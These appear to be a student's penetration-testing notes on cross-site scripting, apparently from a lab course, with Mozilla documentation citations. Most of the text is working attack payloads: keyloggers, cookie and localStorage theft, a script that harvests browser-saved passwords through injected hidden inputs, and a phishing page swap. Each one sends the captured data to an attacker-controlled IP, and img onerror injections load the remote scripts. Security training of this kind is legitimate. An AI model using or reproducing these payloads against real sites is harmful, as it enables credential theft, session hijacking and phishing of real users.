#### Javascript method

=====
function processData(data) {
    data.items.forEach(item => {
      console.log(item)
    });
  }

let foo = {
    items: [
      "Hello",
      "Zdravo",
      "Hola"
    ]
  }

processData(foo)
=====

(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Functions ↩︎

2
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API ↩︎

3
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/Window ↩︎

4
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/Document ↩︎

type "allow pasting" in firefox web console.

====
let inputs = document.getElementsByTagName("input") 

for (let input of inputs){
    console.log(input.value)
}

====

#### key logging

====
function logKey(event){
	console.log(event.key);
	fetch("http://192.168.49.51/k?key=" + event.key);
}

document.addEventListener('keydown', logKey);
====

1
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/Window/location ↩︎

2
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage ↩︎

3
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/Document ↩︎

4
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/Events ↩︎

5
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch ↩︎

6
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise ↩︎

7
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/Document/keydown_event ↩︎

In case of innerHTML script tag does not get executed. use img tag.
<img src=x onerror=alert(0)>

https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML ↩︎

====

<script src="http://<KALI_IP>/xss.js"></script>

echo "alert(1)" > xss.js

Host xss.js on kali

====
##### Encoded Cookie
nano xss.js
cat xss.js
----
let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://192.168.49.51/exfil?data=" + encodedCookie)
----
python3 -m http.server 80

<script src="http://192.168.49.129/xss.js"></script>

<img src=x onerror=fetch("http://192.168.49.129/exfil?data="+encodeURIComponent(document.cookie))>



##### Encoded Local Storage
----

let data = JSON.stringify(localStorage)

let encodedData = encodeURIComponent(data)

fetch("http://192.168.49.51/exfil?data=" + encodedData)

----

<script src=http://192.168.49.57/xss.js></script>

<img src=x onerror=fetch("http://192.168.49.57/exfil?data="+encodeURIComponent(JSON.stringify(localStorage)))>


#### Keylogging

-----

>>> cat xss.js

function logKey(event){
        fetch("http://192.168.49.51/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);

-----

<script src=http://192.168.49.57/xss.js></script>

#### Stealing saved passwords

----

    let body = document.getElementsByTagName("body")[0]
  
    var u = document.createElement("input");
    u.type = "text";
    u.style.position = "fixed";
    //u.style.opacity = "0";
  
    var p = document.createElement("input");
    p.type = "password";
    p.style.position = "fixed";
    //p.style.opacity = "0";
 
    body.append(u)
    body.append(p)
 
    setTimeout(function(){ 
            fetch("http://192.168.49.51/k?u=" + u.value + "&p=" + p.value)
     }, 5000);


----

<script src=http://192.168.49.57/xss.js></script>

#### Phishing Users

----

fetch("login").then(res => res.text().then(data => {
	document.getElementsByTagName("html")[0].innerHTML = data
	document.getElementsByTagName("form")[0].action = "http://192.168.49.51"
	document.getElementsByTagName("form")[0].method = "get"
}))

----

 https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions ↩︎
 
 >>>> cat phishing.js
 
 ---
 document.getElementsByTagName("html")[0].innerHTML = '<form action="http://192.168.49.57/login" method="get"><div class="container"><label for="uname"><b>Username</b></label><input type="text" placeholder="Enter Username" name="username" required><label for="psw"><b>Password</b></label><input type="password" placeholder="Enter Password" name="password" required><button type="submit">Login</button></div></form>' 
 ---
 
 >>>> cat login.html
 
 ---
 <form action="http://192.168.49.57/login" method="get"><div class="container"><label for="uname"><b>Username</b></label><input type="text" placeholder="Enter Username" name="username" required><label for="psw"><b>Password</b></label><input type="password" placeholder="Enter Password" name="password" required><button type="submit">Login</button></div></form>
 ---
 
Fetch only brings the content. But does not execute. so we are creating script element.
 
 <img src=x onerror="const script = document.createElement('script');script.src = 'http://192.168.49.57/phishing.js';script.async = true;document.body.appendChild(script);">
